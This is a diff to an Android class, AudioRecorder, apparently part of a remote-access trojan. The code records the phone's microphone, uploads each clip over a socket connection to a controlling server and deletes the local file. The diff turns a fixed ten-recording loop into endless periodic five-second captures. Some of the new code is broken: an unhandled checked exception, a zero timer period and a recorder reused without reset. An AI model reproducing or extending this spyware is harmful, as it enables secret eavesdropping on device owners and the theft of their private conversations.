@@ -1,3 +1,4 @@
+
 package com.remote.app;
 
 import android.media.MediaRecorder;
@@ -11,6 +12,7 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.time.Duration;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -20,12 +22,20 @@ public  class AudioRecorder {
     static MediaRecorder recorder;
     static File audiofile = null;
     static final String TAG = "MediaRecording";
-    static TimerTask stopRecording;
+    
+    static final Timer timer;
+    
+    static {
+        timer = new Timer();
+        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
+        recorder = new MediaRecorder();
+        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+    }
 
 
-    public static void startRecording() throws Exception {
-
-
+    public static File startRecording() throws Exception {
         //Creating file
         File dir = MainService.getContextOfApplication().getCacheDir();
         try {
@@ -33,52 +43,51 @@ public  class AudioRecorder {
             audiofile = File.createTempFile("sound", ".mp3", dir);
         } catch (IOException e) {
             Log.e(TAG, "external storage access error");
-            return;
+            return null;
         }
-
-
-        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
-        recorder = new MediaRecorder();
-        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        
         recorder.setOutputFile(audiofile.getAbsolutePath());
         try{
-        recorder.prepare();
-         JSONObject object = new JSONObject();
+            recorder.prepare();
+            JSONObject object = new JSONObject();
             object.put("file",true);
             object.put("name","true");
             object.put("buffer" , "starterd recoding");
-        IOSocket.getInstance().getIoSocket().emit("0xlive" , object);
-
+        IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
         }
-        catch (Exception e) {
-         JSONObject object = new JSONObject();
+        catch(Exception e){
+            JSONObject object = new JSONObject();
             object.put("file",true);
             object.put("name","true");
             object.put("buffer" , e.getMessage());
-            IOSocket.getInstance().getIoSocket().emit("0xlive" ,object );
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
 
         }
+
+
+
+        
         recorder.start();
-
-
-        stopRecording = new TimerTask() {
-            @Override
-            public void run() {
-                //stopping recorder
-                recorder.stop();
-                recorder.release();
-                sendVoice(audiofile);
-                audiofile.delete();
-            }
-        };
-
-        new Timer().schedule(stopRecording, 5000);
+        
+        return audiofile;
+    }
+    
+    public static void stopRecordingIn(int seconds) {
+        try {
+            Thread.sleep(Duration.ofSeconds(seconds));
+            recorder.stop();
+        } catch (Exception e) {
+             Log.e(TAG, "error while schedule the stoping recorder");
+        }
+    } 
+    
+    private static void releaseMic() {
+        try {
+            recorder.release();
+        } catch (Exception e) {}
     }
 
-    private static void sendVoice(File file){
-
+    private static void sendFileAndDelete(File file){
         int size = (int) file.length();
         byte[] data = new byte[size];
         try {
@@ -90,6 +99,7 @@ public  class AudioRecorder {
             object.put("buffer" , data);
             IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
             buf.close();
+            file.delete();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
         } catch (IOException e) {
@@ -99,25 +109,17 @@ public  class AudioRecorder {
         }
 
     }
-
-
-    public static void send_audioFiles(){
-        int limit = 0;
-        while(limit < 10){
-            try{
-                startRecording();
-                limit++;
+    
+    public static void sendPeriodically() {
+        TimerTask task = new TimerTask() {
+            @Override
+            public void run() {
+                File audiFile = startRecording();
+                stopRecordingIn(5);
+                sendFileAndDelete(audiFile);
             }
-            catch(Exception e){
-                limit++;
-            }
-        }
-
-
+        };  
+        timer.scheduleAtFixedRate(task, 0, 0);;
     }
 
-
 }
-
-
-
